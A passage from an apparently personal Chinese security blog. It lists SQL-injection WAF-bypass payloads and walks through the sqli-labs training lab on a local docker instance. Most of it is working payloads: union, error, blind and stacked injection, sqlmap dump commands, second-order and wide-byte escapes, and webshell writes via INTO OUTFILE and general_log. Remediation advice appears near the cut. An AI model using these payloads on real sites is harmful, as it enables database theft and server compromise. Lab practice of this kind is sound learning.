为止。\n\n​\t用burpsuite抓包提交，复制整个包信息放在第一个包最后，把第一个包close改成keep-alive把brupsuite自动更新Content-Length勾去掉，有些WAF不会对第一个包的参数进行检测。\n\n\n\n### 2.21 利用multipart/form-data绕过\n\n​\tmultipart/form-data 表示该数据被编码为一条消息，页上的每个控件对应消息中的一个部分。所以，当 waf 没有规则匹配该协议传输的数据时可被绕过。\n\n\n\n### 2.22 order by 绕过\n\n```sql\nselect * from users where id=1 into @a,@b,@c,@d; # 替代order by猜解字段数\n```\n\n\n\n### 2.23 修改请求方式绕过\n\n```php\n<?php\necho $_REQUEST['id'];\n?>\n```\n\n可以更改请求方式尝试绕过。\n\n\n\n### 2.24 大量字符绕过\n\n```sql\nid=1 and (select 1)=(select 0xAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA)/*!union*//*!select*/1,user()\n```\n\n\n\n### 2.25 花括号绕过\n\n```sql\nselect 1,2 union select{x 1},user(); # 花括号左边是注释的内容\n```\n\n\n\n### 2.26 union select绕过\n\n```sql\nsel<>ect # 程序过滤<>为空 脚本处理\nsele/**/ct # 程序过滤/**/为空\n/*!%53eLEct*/ # url 编码与内联注释\nse%0blect # 使用空格绕过\nsele%ct # 使用百分号绕过\n%53eLEct # 编码绕过\nuNIoN sELecT 1,2\nunion all select 1,2\nunion DISTINCT select 1,2\nnull+UNION+SELECT+1,2\n/*!union*//*!select*/1,2\nunion/**/select/**/1,2\nand(select 1)=(Select 0xA*1000)/*!uNIOn*//*!SeLECt*/ 1,user()\n/*!50000union*//*!50000select*/1,2\n/*!40000union*//*!40000select*/1,2\n%0aunion%0aselect 1,2\n%250aunion%250aselect 1,2\n%09union%09select 1,2\n%0caunion%0cselect 1,2\n%0daunion%0dselect 1,2\n%0baunion%0bselect 1,2\n%0d%0aunion%0d%0aselect 1,2\n--+%0d%0aunion--+%0d%0aselect--+%0d%0a1,--+%0d%0a2\n/*!12345union*//*!12345select*/1,2;\n/*中文*/union/*中文*/select/*中文*/1,2;\n/* */union/* */select/ */1,2;\n/*!union*//*!00000all*//*!00000select*/1,2\n```\n\n\n\n\n\n## 3. sqli-labs通关\n\n这里跟着[国光佬](https://www.sqlsec.com/2020/05/sqlilabs.html)学习\n\n### 3.1 准备工作\n\n**sqli-labs环境搭建**\n\n```bash\ndocker pull acgpiano/sqli-labs\ndocker run -dt --name sqli-labs -p 8888:80 acgpiano/sqli-labs:latest\n```\n\n中间可能报错，只需要关闭代理就行。\n\n```bash\nError response from daemon: Head \"https://registry-1.docker.io/v2/acgpiano/sqli-labs/manifests/latest\": Get \"https://auth.docker.io/token?account=squarehhh&scope=repository%3Aacgpiano%2Fsqli-labs%3Apull&service=registry.docker.io\": EOF\n```\n\n访问网页，环境搭建完毕。\n\n![image-20250305014536324](sql注入/image-20250305014536324.png)\n\n### 3.2 Less 1-20\n\n#### 3.2.1 Less-1\n\n```php\n$id=$_GET['id'];\n$sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";\n\nif true\n  \t\"查询结果\"\nelse \n\tprint_r(mysql_error());  \n```\n\n**联合注入**\n\n手工\n\n```sql\n?id=-1' union select 1,2,(select group_concat(schema_name) from information_schema.schemata)%23 # 查库\n?id=-1' union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=\"security\")%23 # 查表\n?id=-1' union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name=\"users\")%23 # 查字段\n?id=-1' union select 1,2,(select group_concat(username,password SEPARATOR 0x3c62723e) from users)%23 # 0x3c62723e=<br>，即按换行分割\n```\n\nsqlmap\n\n```bash\n$ python sqlmap.py -u \"http://localhost:8888/Less-1/?id=1\" --technique=U -v 3 -D security -T users --dump --batch\n```\n\n**报错注入**\n\n手工\n\n```sql\n?id=1'and updatexml(1,concat(0x7e,(select concat(username,password) from users limit 0,1),0x7e),1)%23\n?id=1'and extractvalue(1,concat(0x7e,(select concat(username,password) from users limit 0,1),0x7e))%23\n?id=1'and (select 1 from (select count(*),concat((select concat(username,password) from users limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23\n```\n\nsqlmap\n\n```bash\n$ python sqlmap.py -u \"http://localhost:8888/Less-1/?id=1\" --technique=E -v 3 -D security -T users --dump --batch\n```\n\n**布尔盲注**\n\n手工\n\n```sql\n?id=1'and ascii(substr((select concat(username,password) from users limit 0,1),1,1))>67 %23 # 有回显\n?id=1'and ascii(substr((select concat(username,password) from users limit 0,1),1,1))>68 %23 # 无回显\n```\n\nsqlmap\n\n```bash\n$ python sqlmap.py -u \"http://localhost:8888/Less-1/?id=1\" --technique=B -v 3 -D security -T users --dump --batch\n```\n\n**时间盲注**\n\n手工\n\n```sql\n?id=1'and if(ascii(substr((select concat(username,password) from users limit 0,1),1,1))>68,1,sleep(5)) %23\n```\n\nsqlmap\n\n```bash\n$ python sqlmap.py -u \"http://localhost:8888/Less-1/?id=1\" --technique=T -v 3 -D security -T users --dump --batch\n```\n\n#### 3.2.2 Less-2\n\n```php\n$sql=\"SELECT * FROM users WHERE id=$id LIMIT 0,1\";\n```\n\n闭合方式改变。\n\n#### 3.2.3 Less-3\n\n```php\n$sql=\"SELECT * FROM users WHERE id=('$id') LIMIT 0,1\";\n```\n\n闭合方式改变。\n\n#### 3.2.4 Less-4\n\n```php\n$sql=\"SELECT * FROM users WHERE id=($id) LIMIT 0,1\";\n```\n\n闭合方式改变。\n\n#### 3.2.5 Less-5\n\n```php\n$sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";\nif true\n  \techo 'You are in...........';\nelse \n\tprint_r(mysql_error());\n```\n\n不支持联合查询。\n\n#### 3.2.6 Less-6\n\n```php\n$sql=\"SELECT * FROM users WHERE id=$id LIMIT 0,1\";\nif true\n  \techo 'You are in...........';\nelse \n\tprint_r(mysql_error());\n```\n\n闭合方式不一样。\n\n#### 3.2.7 Less-7\n\n```php\n$sql=\"SELECT * FROM users WHERE id=(('$id')) LIMIT 0,1\";\n$sql=\"SELECT * FROM users WHERE id=$id LIMIT 0,1\";\nif true\n  \techo 'You are in.... Use outfile......';\nelse \n\t//print_r(mysql_error());\n    echo \"You have an error in your SQL syntax\";\n```\n\n**布尔盲注**\n\n```sql\n?id=1'))and ascii(substr((select concat(username,password) from users limit 0,1),1,1))>67 %23 //正常回显\n?id=1'))and ascii(substr((select concat(username,password) from users limit 0,1),1,1))>68 %23 //报错\n```\n\n**时间盲注**\n\n```sql\n?id=1'))and if(ascii(substr((select concat(username,password) from users limit 0,1),1,1))>67,1,sleep(5)) %23 //不延时\n?id=1'))and if(ascii(substr((select concat(username,password) from users limit 0,1),1,1))>68,1,sleep(5)) %23 //延时\n```\n\n**outfile**\n\n这里因为提示`Use outfile`，因此可以尝试写文件。\n\n```bash\n$ mysql -e \"show global variables like '%secure%';\"\n+------------------+-------+\n| Variable_name    | Value |\n+------------------+-------+\n| secure_auth      | OFF   |\n| secure_file_priv |       |\n+------------------+-------+\n```\n\n当`secure_file_priv`为`null`时，表示限制`mysql`不允许导入导出。\n\n当`secure_file_priv`为`/tmp`时，表示限制`mysql`只能在`/tmp`目录下导入导出。\n\n当`secure_file_priv`为`空`时，表示限制`mysql`不对导入导出做限制。\n\n这里还需要赋予文件写入的权限\n\n```bash\n$ chmod -R 777 /var/www/html\n```\n\n然后执行sql语句\n\n```sql\n?id=1'))union select * from security.users into outfile \"/var/www/html/Less-7/user.txt\"%23\n```\n\n![image-20250310220651812](sql注入/image-20250310220651812.png)\n\n这里也可以写入shell\n\n```sql\n?id=1'))union select 1,2,\"<?php phpinfo();?>\" into outfile \"/var/www/html/Less-7/info.php\"%23\n```\n\n![image-20250310220934038](sql注入/image-20250310220934038.png)\n\n#### 3.2.8 Less-8\n\n```php\n$sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";\nif true\n  \techo 'You are in....';\nelse \n\t//print_r(mysql_error());\n    //echo \"You have an error in your SQL syntax\";\n```\n\n闭合方式改变。\n\n#### 3.2.9 Less-9\n\n```php\n$sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";\n$sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";\nif true\n  \techo 'You are in....';\nelse \n\techo 'You are in....';\n```\n\n只能用延时注入。\n\n#### 3.2.10 Less-10\n\n```php\n$sql=\"SELECT * FROM users WHERE id=$id LIMIT 0,1\";\nif true\n  \techo 'You are in....';\nelse \n\techo 'You are in....';\n```\n\n闭合方式改变。\n\n#### 3.2.11 Less-11\n\n```php\n$uname=$_POST['uname'];\n$passwd=$_POST['passwd'];\n\n@$sql=\"SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1\";\nif true\n  \t\"查询结果\"\nelse \n\tprint_r(mysql_error());\n```\n\n与Less-1一致。\n\n#### 3.2.12 Less-12\n\n```php\n$uname=$_POST['uname'];\n$passwd=$_POST['passwd'];\n\n@$sql=\"SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1\";\nif true\n  \t\"查询结果\"\nelse \n\tprint_r(mysql_error());\n```\n\n闭合方式改变。\n\n#### 3.2.13 Less-13\n\n```php\n$uname=$_POST['uname'];\n$passwd=$_POST['passwd'];\n\n@$sql=\"SELECT username, password FROM users WHERE username=('$uname') and password=('$passwd') LIMIT 0,1\";\nif true\n  \t//\"查询结果\"\nelse \n\tprint_r(mysql_error());\t\n```\n\n闭合方式改变，不能用联合查询。\n\n#### 3.2.14 Less-14\n\n```php\n$uname=$_POST['uname'];\n$passwd=$_POST['passwd'];\n\n@$sql=\"SELECT username, password FROM users WHERE username=$uname and password=$passwd LIMIT 0,1\";\nif true\n  \t//\"查询结果\"\nelse \n\tprint_r(mysql_error());\n```\n\n闭合方式改变。\n\n#### 3.2.15 Less-15\n\n```php\n$uname=$_POST['uname'];\n$passwd=$_POST['passwd'];\n\n@$sql=\"SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1\";\nif true\n  \t//\"查询结果\"\nelse \n\t//print_r(mysql_error());\n```\n\n闭合方式改变，不能使用报错。\n\n#### 3.2.16 Less-16\n\n```php\n$uname=$_POST['uname'];\n$passwd=$_POST['passwd'];\n\n@$sql=\"SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1\";\nif true\n  \t//\"查询结果\"\nelse \n\t//print_r(mysql_error());\n```\n\n闭合类型改变。\n\n#### 3.2.17 Less-17\n\n```php\n//过滤\n$uname=check_input($_POST['uname']);\n$passwd=$_POST['passwd'];\n\n@$sql=\"SELECT username, password FROM users WHERE username= $uname LIMIT 0,1\";\n\nif true\n    $update=\"UPDATE users SET password = '$passwd' WHERE username='$row1'\";\n\tif error\n        print_r(mysql_error());\n```\n\n`uname`被过滤了，只能考虑update这里注入，使用报错注入即可。\n\n#### 3.2.18 Less-18\n\n```php\n$uagent = $_SERVER['HTTP_USER_AGENT'];\n$IP = $_SERVER['REMOTE_ADDR'];\n//uname和passwd被过滤\n$uname = check_input($_POST['uname']);\n$passwd = check_input($_POST['passwd']);\n\n$sql=\"SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1\";\n\nif true\n    $insert=\"INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)\";\n\techo 'Your User Agent is: ' .$uagent;\n\tprint_r(mysql_error());\t\nelse \n    print_r(mysql_error());\n```\n\n这里`uname`和`passwd`被过滤了，因此只能在insert语句注入。\n\n- `$_SERVER['HTTP_CLIENT_IP']` 客户端可以伪造。\n- `$_SERVER['HTTP_X_FORWARDED_FOR']`，客户端可以伪造。\n- `$_SERVER['REMOTE_ADDR']`，客户端不能伪造。\n\n所以这里只能在`User-Agent`注入。\n\n```sql\nUser-Agent: 1'and (select 1 from (select count(*),concat((select concat(username,password) from users limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '1'='1\n```\n\n![image-20250310224830354](sql注入/image-20250310224830354.png)\n\n#### 3.2.19 Less-19\n\n```php\n$uagent = $_SERVER['HTTP_REFERER'];\n$IP = $_SERVER['REMOTE_ADDR'];\n//uname和passwd被过滤\n$uname = check_input($_POST['uname']);\n$passwd = check_input($_POST['passwd']);\n\n$sql=\"SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1\";\n\nif true\n    $insert=\"INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES ('$uagent', '$IP')\";\n\techo 'Your Referer is: ' .$uagent;\n\tprint_r(mysql_error());\t\nelse \n    print_r(mysql_error());\n```\n\n`User-Agent`改为了`Referer`。\n\n#### 3.2.20 Less-20\n\n```php\nif(!isset($_COOKIE['uname']))\n    //过滤uname和passwd\n    $uname = check_input($_POST['uname']);\n    $passwd = check_input($_POST['passwd']);\n\n    $sql=\"SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1\";\n    $cookee = $row1['username'];\n    if true\n        setcookie('uname', $cookee, time()+3600);\n    else:\n        print_r(mysql_error());\nelse:\n    if(!isset($_POST['submit']))\n        $cookee = $_COOKIE['uname'];\n\n        $sql=\"SELECT * FROM users WHERE username='$cookee' LIMIT 0,1\";\n        if (!$result)\n            print_r(mysql_error());\n        if($row)\n            \"输出查询的信息\"\n    else:\n        setcookie('uname', $row1['username'], time()-3600);\n?>\n```\n\n就是从`Cookie`中读取`uname`值，产生注入。\n\n### 3.3 Less21-37\n\n#### 3.3.1 Less-21\n\n```php\n$cookee = base64_decode($cookee);\n$sql=\"SELECT * FROM users WHERE username=('$cookee') LIMIT 0,1\";\n```\n\n只节选了相关代码，其余与`Less-20`大差不差，主要是多了一个base64编码，这里可以用sqlmap脚本。\n\n```bash\n$ python sqlmap.py -u http://127.0.0.1:8888/Less-21/ --cookie=\"uname=*\" --tamper=\"base64encode\" -v 3 -D security -T users --dump --batch\n```\n\n![image-20250310230842396](sql注入/image-20250310230842396.png)\n\n#### 3.3.2 Less-22\n\n```php\n$cookee1 = '\"'. $cookee. '\"';    \n$sql=\"SELECT * FROM users WHERE username=$cookee1 LIMIT 0,1\";\n```\n\n闭合方式改变\n\n#### 3.3.3 Less-23\n\n```php\n$id=$_GET['id'];\n\n$reg = \"/#/\";\n$reg1 = \"/--/\";\n$replace = \"\";\n$id = preg_replace($reg, $replace, $id);\n$id = preg_replace($reg1, $replace, $id);\n\n$sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";\n\nif true\n    \"查询结果\"\nelse:\n    print_r(mysql_error());\n```\n\n过滤了注释符，可以使用闭合方式。\n\n#### 3.3.4 Less-24\n\n`login_create.php`\n\n```php\n$username=  mysql_escape_string($_POST['username']) ;\n$pass= mysql_escape_string($_POST['password']);\n$re_pass= mysql_escape_string($_POST['re_password']);\n\n$sql = \"select count(*) from users where username='$username'\";\n\nif ($pass==$re_pass)\n  $sql = \"insert into users ( username, password) values(\\\"$username\\\", \\\"$pass\\\")\";\n```\n\n`login.php`\n\n```php\n$username = mysql_real_escape_string($_POST[\"login_user\"]);\n$password = mysql_real_escape_string($_POST[\"login_password\"]);\n$sql = \"SELECT * FROM users WHERE username='$username' and password='$password'\";\n```\n\n`pass_change.php`\n\n```php\n$username= $_SESSION[\"username\"];\n$curr_pass= mysql_real_escape_string($_POST['current_password']);\n$pass= mysql_real_escape_string($_POST['password']);\n$re_pass= mysql_real_escape_string($_POST['re_password']);\n\nif($pass==$re_pass)\n    $sql = \"UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' \";\n```\n\n这里大部分都被转义了，唯一可利用的地方在最后的`update`语句中的`username`，这里需要利用二次注入，即将构造的sql语句插入数据库中，在其被调用时触发。\n\n比如数据库有`username`值为`admin'#`，被拼接进`update`语句就会变成：\n\n```sql\nUPDATE users SET PASSWORD='$pass' where username='admin'#' and password='$curr_pass'\n```\n\n那么就直接修改了`admin`用户的密码。\n\n先注册一个名为`admin'#`的用户\n\n![image-20250310232549937](sql注入/image-20250310232549937.png)\n\n然后登录后修改密码\n\n![image-20250310232652649](sql注入/image-20250310232652649.png)\n\n查看数据库发现`admin`用户密码被成功修改了\n\n```bash\nmysql> select * from security.users;\n+----+----------+------------+\n| id | username | password   |\n+----+----------+------------+\n|  1 | Dumb     | Dumb       |\n|  2 | Angelina | I-kill-you |\n|  3 | Dummy    | p@ssword   |\n|  4 | secure   | crappy     |\n|  5 | stupid   | stupidity  |\n|  6 | superman | genious    |\n|  7 | batman   | mob!le     |\n|  8 | admin    | 1234       |\n|  9 | admin1   | admin1     |\n| 10 | admin2   | admin2     |\n| 11 | admin3   | admin3     |\n| 12 | dhakkan  | dumbo      |\n| 14 | admin4   | admin4     |\n| 15 | admin'#  | 123        |\n+----+----------+------------+\n```\n\n#### 3.3.5 Less-25\n\n接下来很多是绕过过滤的，所以只考虑绕过过滤的部分。\n\n```php\n$sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";\n\n$id= preg_replace('/or/i',\"\", $id);    \n$id= preg_replace('/AND/i',\"\", $id);\n```\n\n双写绕过`oorr`，符号替换`or`换成`||`。\n\n#### 3.3.6 Less-25a\n\n无区别。\n\n#### 3.3.7 Less-26\n\n```php\n$id= preg_replace('/or/i',\"\", $id);           \n$id= preg_replace('/and/i',\"\", $id);     \n$id= preg_replace('/[\\/\\*]/',\"\", $id);     \n$id= preg_replace('/[--]/',\"\", $id);    \n$id= preg_replace('/[#]/',\"\", $id);       \n$id= preg_replace('/[\\s]/',\"\", $id);     \n$id= preg_replace('/[\\/\\\\\\\\]/',\"\", $id);    \n```\n\n`or`和`and`使用双写或者`||``&&`替换。\n\n过滤注释使用闭合绕过。\n\n空格字符绕过\n\n`%a0`：空格\n\n`%09`：TAB键（水平）\n\n`%0a`：新建一行\n\n`%0c`：新的一页\n\n`%0d`：return功能\n\n`%0b`：TAB键（垂直）\n\n`%00`：空字符\n\n#### 3.3.8 Less-26a\n\n无区别。\n\n#### 3.3.9 Less-27\n\n```php\n$id= preg_replace('/[\\/\\*]/',\"\", $id);\n$id= preg_replace('/[--]/',\"\", $id);\n$id= preg_replace('/[#]/',\"\", $id);\n$id= preg_replace('/[ +]/',\"\", $id);\n$id= preg_replace('/select/m',\"\", $id);\n$id= preg_replace('/select/s',\"\", $id);\n$id= preg_replace('/Select/s',\"\", $id);\n$id= preg_replace('/SELECT/s',\"\", $id);\n$id= preg_replace('/union/s',\"\", $id);\n$id= preg_replace('/Union/s',\"\", $id);\n$id= preg_replace('/UNION/s',\"\", $id);\n```\n\n`select`和`union`使用大小写绕过和嵌套绕过即可。\n\n#### 3.3.10 Less-27a\n\n无区别。\n\n#### 3.3.11 Less-28\n\n```php\n$id= preg_replace('/[\\/\\*]/',\"\", $id);\n$id= preg_replace('/[--]/',\"\", $id);\n$id= preg_replace('/[#]/',\"\", $id);\n$id= preg_replace('/[ +]/',\"\", $id);.\n$id= preg_replace('/union\\s+select/i',\"\", $id);\n```\n\n不能大小写绕过，嵌套绕过即可。\n\n#### 3.3.12 Less-28a\n\n无区别。\n\n#### 3.3.13 Less-29\n\n这里主要难点在`login.php`而不是`index.php`中。\n\n```php\n//提取id\nfunction java_implimentation($query_string)\n{\n\t$q_s = $query_string;\n\t$qs_array= explode(\"&\",$q_s);\n\tforeach($qs_array as $key => $value)\n\t{\n\t\t$val=substr($value,0,2);\n\t\tif($val==\"id\")\n\t\t{\n\t\t\t$id_value=substr($value,3,30); \n\t\t\treturn $id_value;\n\t\t\techo \"<br>\";\n\t\t\tbreak;\n\t\t}\n\t}\n}\n$qs = $_SERVER['QUERY_STRING'];\n$hint=$qs;\n$id1=java_implimentation($qs);\n$id=$_GET['id'];\n//id只能为数字\nwhitelist($id1);\n$sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";\n```\n\n这里可以构造两个`id`，因为`java_implimentation()`函数只会拿到第一个`id`去检测，从而使得后面`id`绕过检测。\n\n这里根据语言特性绕过可以看本文前面部分。\n\n#### 3.3.14 Less-30\n\n没区别。\n\n#### 3.3.15 Less-31\n\n没区别。\n\n#### 3.3.16 Less-32\n\n```php\nfunction check_addslashes($string)\n{\n    $string = preg_replace('/'. preg_quote('\\\\') .'/', \"\\\\\\\\\\\\\", $string);  \n    $string = preg_replace('/\\'/i', '\\\\\\'', $string);\n    $string = preg_replace('/\\\"/', \"\\\\\\\"\", $string);      \n    return $string;\n}\n\n$id=check_addslashes($_GET['id']);\n\n$sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";\n```\n\n宽字节注入，`%df%5c`被当做一个汉字，使得`'`逃逸。\n\n使用`\\`转义`\\`，如`\\\\'`，第二个`\\`被转义，使`'`出来。\n\n将 utf-8 转换为 utf-16 或 utf-32，例如将 `'` 转为 utf-16 为`�`\n\n```bash\n$ echo \\'|iconv -f utf-8 -t utf-16\n��'\n```\n\n> 这里我的理解是，�在URL编码后为`%EF%BF%BD`，MySQL 在使用 GBK 编码的时候，`%EF%BF`被当做一个汉字，`%BD`与`%5c`也就是`\\`被当做一个汉字，因此单引号逃逸出来。\n\n可以让`'`逃逸出来\n\n```sql\n?id=1�'or 1%23\n```\n\n![image-20250311002549978](sql注入/image-20250311002549978.png)\n\n#### 3.3.17 Less-33\n\n没区别。\n\n#### 3.3.18 Less-34\n\n没区别。\n\n#### 3.3.19 Less-35\n\n没区别。\n\n#### 3.3.20 Less-36\n\n没区别\n\n#### 3.3.21 Less-37\n\n没区别。\n\n### 3.4 Less-38-53\n\n> 下面无特殊利用的就当做无区别了。\n\n#### 3.4.1 Less-38\n\n```php\n$id=$_GET['id'];\n\n$sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";\nif (mysqli_multi_query($con1, $sql)):\n    \"查询结果\"\nelse:\n    print_r(mysqli_error($con1));\n```\n\n产生堆叠的原因在于`mysqli_multi_query()`函数，它会执行一个或用分号隔开的多个SQL语句。\n\n堆叠注入可以直接写马GetShell。\n\n这里先查看mysql配置\n\n```bash\nmysql> show variables like 'general%';\n+------------------+---------------------------------+\n| Variable_name    | Value                           |\n+------------------+---------------------------------+\n| general_log      | OFF                             |\n| general_log_file | /var/lib/mysql/e783195a8830.log |\n+------------------+---------------------------------+\n```\n\n可以看见默认没有开启，首先手动开启。\n\n```sql\n?id=1';set global general_log=\"ON\";set global general_log_file='/var/www/html/Less-38/shell.php'%23\n```\n\n```bash\nmysql> show variables like 'general%';\n+------------------+---------------------------------+\n| Variable_name    | Value                           |\n+------------------+---------------------------------+\n| general_log      | ON                              |\n| general_log_file | /var/www/html/Less-38/shell.php |\n+------------------+---------------------------------+\n```\n\n然后就可以写入php代码了\n\n```sql\n?id=1';select '<?php phpinfo();?>'%23\n```\n\n查看文件\n\n```bash\n$ cat /var/www/html/Less-38/shell.php\n250311 14:32:51    10 Connect   root@localhost on security\n                   10 Init DB   security\n                   10 Query     SELECT * FROM users WHERE id='1';select '<?php phpinfo();?>'#' LIMIT 0,1\n```\n\n成功写入，但是可能是权限的问题，没有成功执行。\n\n#### 3.4.2 Less-39\n\n无区别\n\n#### 3.4.3 Less-40\n\n无区别\n\n#### 3.4.4 Less-41\n\n无区别\n\n#### 3.4.5 Less-42\n\n类似于`Less-24`，少了一些过滤。\n\n#### 3.4.6 Less-43\n\n无区别。\n\n#### 3.4.7 Less-44\n\n无区别。\n\n#### 3.4.8 Less-45\n\n无区别。\n\n#### 3.4.9 Less-46\n\n```php\n$id=$_GET['sort'];\n\n$sql = \"SELECT * FROM users ORDER BY $id\";\n\nif true\n    \"查询结果\"\nelse：\n    print_r(mysql_error());\n```\n\n`order by`注入，具体看本文order by注入部分。\n\n#### 3.4.10 Less-47\n\n无区别。\n\n#### 3.4.11 Less-48\n\n无区别。\n\n#### 3.4.12 Less-49\n\n无区别。\n\n#### 3.4.13 Less-50\n\n无区别。\n\n#### 3.4.14 Less-51\n\n无区别。\n\n#### 3.4.15 Less-52\n\n无区别。\n\n#### 3.4.16 Less-53\n\n无区别。\n\n### 3.5 Less54-65\n\n#### 3.5.1 Less-54\n\n```php\n$times= 10;\n\nif(isset($_POST['reset']))\n    setcookie('challenge', ' ', time() - 3600000);\n\nelse:\n    if(isset($_COOKIE['challenge']))\n        $sessid=$_COOKIE['challenge'];\n    else:\n        $expire = time()+60*60*24*30;\n        $hash = data($table,$col);\n        setcookie(\"challenge\", $hash, $expire);\n    if $_GET['id']:\n        $sql=\"SELECT * FROM security.users WHERE id='$id' LIMIT 0,1\";\n    if true\n        \"查询结果\"\n    else：\n       \n$key = addslashes($_POST['key']);\n$key = mysql_real_escape_string($key);\n$sql=\"SELECT 1 FROM $table WHERE $col1= '$key'\";\n```\n\n十次以内查出结果\n\n判断闭合\n\n```sql\n?id=1'\n?id=1'%23\n```\n\n判断字段数\n\n```sql\n?id=1'order by 3%23\n?id=1'order by 4%23\n```\n\n查数据库名\n\n```sql\n?id=-1'union select 1,2,(select group_concat(schema_name) from information_schema.schemata)%23\ninformation_schema,challenges,mysql,performance_schema,security\n```\n\n查表名\n\n```sql\n?id=-1'union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema='challenges')%23\n1KBD9AIPC9\n```\n\n查字段名\n\n```sql\n?id=-1'union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name='1KBD9AIPC9')%23\nid,sessid,secret_2TF1,tryy\n```\n\n查key值\n\n```sql\n?id=-1'union select 1,2,(select concat(secret_2TF1) from challenges.1KBD9AIPC9)%23\nvJWlm4ld9mZEZN2o7n59t4A8\n```\n\n总共八次。\n\n#### 3.5.2 Less-55\n\n无区别。\n\n#### 3.5.3 Less-56\n\n无区别。\n\n#### 3.5.4 Less-57\n\n无区别。\n\n#### 3.5.5 Less-58\n\n```php\n$sql=\"SELECT * FROM security.users WHERE id='$id' LIMIT 0,1\";\nif true\n    echo 'Your Login name : '. $unames[$row['id']];\n    echo 'Your Password : ' .$pass[$row['id']];\nelse\n    print_r(mysql_error());\n```\n\n联合查询没结果输出，改为报错注入。\n\n#### 3.5.6 Less-59\n\n无区别。\n\n#### 3.5.7 Less-60\n\n无区别。\n\n#### 3.5.8 Less-61\n\n无区别。\n\n#### 3.5.9 Less-62\n\n```php\n$sql=\"SELECT * FROM security.users WHERE id=('$id') LIMIT 0,1\";\nif true\n    echo 'Your Login name : '. $unames[$row['id']];\n    echo 'Your Password : ' .$pass[$row['id']];\nelse\n    //print_r(mysql_error());\n```\n\n不能报错注入了，改为布尔盲注或者时间盲注即可\n\n#### 3.5.9 Less-63\n\n无区别。\n\n#### 3.5.10 Less-64\n\n无区别。\n\n#### 3.5.1 Less-65\n\n无区别。\n\n### 3.6 总结\n\n终于是刷完了，总体来说把每种注入方式都练习了个遍，并学习了一些绕过手法，整个过程除了`Less-1`跟着大佬把`sqlmap`使用熟悉了一下，其余均为手注，加强自己的能力，尽量不变成离了脚本就活不了的脚本小子（）。但是其实还有许多利用手法没有学到，以后遇到就在本文填补，避免做完就忘了。\n","slug":"sql注入","published":1,"updated":"2025-03-11T15:29:06.559Z","comments":1,"layout":"post","photos":[],"_id":"cm8d9pkhn0003lsjfa4jigmdf","content":"<h2 id=\"1-概述\"><a href=\"#1-概述\" class=\"headerlink\" title=\"1. 概述\"></a>1. 概述</h2><p><strong>漏洞描述</strong></p>\n<p>​\tWeb程序代码中对于用户提交的参数未做过滤，被放到SQL语句中执行，导致参数中的特殊字符打破了 SQL 语句原有逻辑，黑客可以利用该漏洞执行任意 SQL 语句，如查询数据、下载数据、写入 webshell 、执行系统命令以及绕过登录限制等。</p>\n<p><strong>漏洞存在条件</strong></p>\n<ul>\n<li>参数用户可控。</li>\n<li>参数带入数据库查询。</li>\n</ul>\n<p><strong>测试方法</strong></p>\n<p>​\t在发现有可控参数的地方使用 sqlmap 进行 SQL 注入的检查或者利用，也可以使用其他的 SQL 注入工具，简单点的可以手工测试，利用单引号、and1=1 和 and 1=2 以及字符型注入进行判断。</p>\n<p><strong>修复方法</strong></p>\n<p>​\t在代码层最佳的防御SQL注入的手段是SQL语句的<strong>预编译和绑定变量</strong>。</p>\n<p>​\t（1）所有的查询语句都使用数据库提供的参数化查询接口，参数化的语句使用参数而不是将用户输入变量嵌入到 SQL 语句中。当前几乎所有的数据库系统都提供了参数化 SQL 语句执行接口，使用此接口可以非常有效的防止SQL注入攻击。</p>\n<p>​\t（2）对进入数据库的特殊字符（ ‘ &lt;&gt;&amp;*; 等）进行转义处理，或编码转换。</p>\n<p>​\t（3）确认每种数据的类型，比如数字型的数据就必须是数字，数据库中的存储字段必须对应为 int 型。</p>\n<p>​\t（4）数据长度应该严格规定，能在一定程度上防止比较长的SQL 注入语句无法正确执行。 </p>\n<p>​\t（5）网站每个数据层的编码统一，建议全部使用 UTF-8 编码，上下层编码不一致有可能导致一些过滤模型被绕过。 </p>\n<p>​\t（6）严格限制网站用户的数据库的操作权限，给此用户提供仅仅能够满足其工作的权限，从而最大限度的减少注入攻击 对数据库的危害。 </p>\n<p>​\t（7）避免网站显示 SQL 错误信息，比如类型错误、字段不匹配等，防止攻击者利用这些错误信息进行一些判断。</p>\n<h3 id=\"1-1-MySQL相关知识\"><a href=\"#1-1-MySQL相关知识\" class=\"headerlink\" title=\"1.1 MySQL相关知识\"></a>1.1 